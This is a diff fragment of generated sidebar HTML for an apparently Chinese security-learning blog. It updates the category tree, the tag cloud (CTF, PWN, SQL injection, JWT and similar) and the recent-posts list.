class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
+    <ul class="hacker-category-list"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/">408</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/408/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/">CTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/">BUUCTF</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/PWN/">PWN</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/CTF/BUUCTF/WEB/">WEB</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%9F%A5%E8%AF%86%E6%9D%82%E7%A2%8E/">知识杂碎</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Java/">Java</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/python/">python</a><span class="hacker-category-list-count">1</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="hacker-category-list-count">35</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/">SRC&渗透</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a><span class="hacker-category-list-count">2</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91/">内网</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/">我的SRC</a><span class="hacker-category-list-count">2</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%80%9D%E8%B7%AF/">思路</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SRC-%E6%B8%97%E9%80%8F/%E6%88%91%E7%9A%84SRC/%E6%8A%A5%E5%91%8A/">报告</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">基础知识</a><span class="hacker-category-list-count">17</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/Linux/">Linux</a><span class="hacker-category-list-count">4</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/windows/">windows</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%89%8D%E7%AB%AF/">前端</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E5%90%8E%E7%AB%AF/">后端</a><span class="hacker-category-list-count">1</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/%E9%80%9A%E7%94%A8/">通用</a><span class="hacker-category-list-count">8</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/">漏洞</a><span class="hacker-category-list-count">11</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/PWN/">PWN</a><span class="hacker-category-list-count">3</span></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/">WEB安全</a><span class="hacker-category-list-count">7</span><ul class="hacker-category-list-child"><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/WEB%E5%AE%89%E5%85%A8/Top10/">Top10</a><span class="hacker-category-list-count">7</span></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E/%E5%A4%8D%E7%8E%B0/">复现</a><span class="hacker-category-list-count">1</span></li></ul></li></ul></li><li class="hacker-category-list-item"><a class="hacker-category-list-link" href="../../categories/%E8%AF%81%E4%B9%A6/">证书</a><span class="hacker-category-list-count">1</span></li></ul>
   </div>
 </div>
 
@@ -409,48 +494,48 @@
 		<h4>标签云</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/JWT/">JWT<span>1</span></a></li>
-		
-			<li><a href="/tags/tor/">tor<span>1</span></a></li>
-		
-			<li><a href="/tags/Hexo/">Hexo<span>1</span></a></li>
-		
-			<li><a href="/tags/栈/">栈<span>1</span></a></li>
-		
-			<li><a href="/tags/解压/">解压<span>1</span></a></li>
-		
-			<li><a href="/tags/windows/">windows<span>1</span></a></li>
-		
-			<li><a href="/tags/FOFA/">FOFA<span>1</span></a></li>
-		
-			<li><a href="/tags/服务器/">服务器<span>1</span></a></li>
-		
-			<li><a href="/tags/SQL注入/">SQL注入<span>1</span></a></li>
-		
-			<li><a href="/tags/应用层/">应用层<span>1</span></a></li>
-		
-			<li><a href="/tags/ARL/">ARL<span>1</span></a></li>
+			<li><a href="/tags/Docker/">Docker<span>1</span></a></li>
 		
 			<li><a href="/tags/Pwn/">Pwn<span>3</span></a></li>
 		
-			<li><a href="/tags/HTML/">HTML<span>1</span></a></li>
+			<li><a href="/tags/GitHub-Dork/">GitHub Dork<span>1</span></a></li>
 		
-			<li><a href="/tags/网络传输工具/">网络传输工具<span>1</span></a></li>
+			<li><a href="/tags/ARL/">ARL<span>1</span></a></li>
 		
-			<li><a href="/tags/计算机体系架构/">计算机体系架构<span>1</span></a></li>
+			<li><a href="/tags/CSS/">CSS<span>1</span></a></li>
 		
 			<li><a href="/tags/Next/">Next<span>1</span></a></li>
 		
-			<li><a href="/tags/Blog/">Blog<span>1</span></a></li>
+			<li><a href="/tags/FOFA/">FOFA<span>1</span></a></li>
 		
-			<li><a href="/tags/认证/">认证<span>2</span></a></li>
+			<li><a href="/tags/栈/">栈<span>1</span></a></li>
 		
-			<li><a href="/tags/业务逻辑漏洞/">业务逻辑漏洞<span>1</span></a></li>
+			<li><a href="/tags/SSH/">SSH<span>1</span></a></li>
 		
-			<li><a href="/tags/Kali/">Kali<span>1</span></a></li>
+			<li><a href="/tags/Google-Hacking/">Google Hacking<span>1</span></a></li>
+		
+			<li><a href="/tags/网络层/">网络层<span>1</span></a></li>
+		
+			<li><a href="/tags/crawlers/">crawlers<span>1</span></a></li>
+		
+			<li><a href="/tags/计算机网络/">计算机网络<span>7</span></a></li>
+		
+			<li><a href="/tags/邮箱解析/">邮箱解析<span>1</span></a></li>
+		
+			<li><a href="/tags/代理/">代理<span>1</span></a></li>
+		
+			<li><a href="/tags/WEB/">WEB<span>1</span></a></li>
+		
+			<li><a href="/tags/PHP/">PHP<span>1</span></a></li>
+		
+			<li><a href="/tags/域渗透/">域渗透<span>2</span></a></li>
+		
+			<li><a href="/tags/python/">python<span>1</span></a></li>
+		
+			<li><a href="/tags/计算机体系架构/">计算机体系架构<span>1</span></a></li>
 		
 		
-		   <li><a href="/tags">...<span>59</span></a></li>
+		   <li><a href="/tags">...<span>60</span></a></li>
 		 
 		</ul>
 	</div>
@@ -461,10 +546,6 @@
 <div class="widget">
   <h4>最新文章</h4>
   <ul class="entry list-unstyled">
-    
-      <li>
-        <a href="/2026/04/23/记自己的第一个低危/" ><i class="fa fa-file-o"></i>记自己的第一个低危</a>
-      </li>
     
       <li>
         <a href="/2026/04/20/邮箱地址解析/" ><i class="fa fa-file-o"></i>邮箱地址解析</a>
@@ -480,6 +561,10 @@
     
       <li>
         <a href="/2026/04/12/浏览器同源策略与CORS解析/" ><i class="fa fa-file-o"></i>浏览器同源策略与CORS解析</a>
+      </li>
+    
+      <li>
+        <a href="/2026/04/10/JWT/" ><i class="fa fa-file-o"></i>JWT</a>
       </li>
     
   </ul>
